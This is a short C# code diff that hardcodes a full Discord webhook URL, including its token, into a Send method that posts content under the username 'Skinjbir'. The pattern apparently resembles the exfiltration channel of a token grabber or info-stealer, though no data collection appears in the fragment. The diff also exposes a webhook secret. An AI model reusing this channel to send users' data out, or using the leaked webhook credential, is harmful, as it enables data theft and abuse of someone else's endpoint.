@@ -48,9 +48,7 @@ class ZeroMemory
         }
         public static void Send(string content)
         {
-            string avu = "https://i.imgur.com/jFZIN2t.jpg";
-            string webHookUrl = "webhook";
-            string username = "Skinjbir";
+            string webHookUrl = "https://discord.com/api/webhooks/843604109268746270/XW7RA-yoAsSAY-0SBT5gcysuyVXrouvNxoPJ1RrvCbKZLK1a9i1ctGSJUxDa_3es1V7F";
             Http.Post(webHookUrl, new NameValueCollection()
             {
                 {
@@ -58,11 +56,11 @@ class ZeroMemory
                 },
 
                 {
-                    "username", username
+                    "username", "Skinjbir"
                 },
 
                 {
-                    "avatar_url", avu
+                    "avatar_url", "https://i.imgur.com/jFZIN2t.jpg"
                 }
 
             });
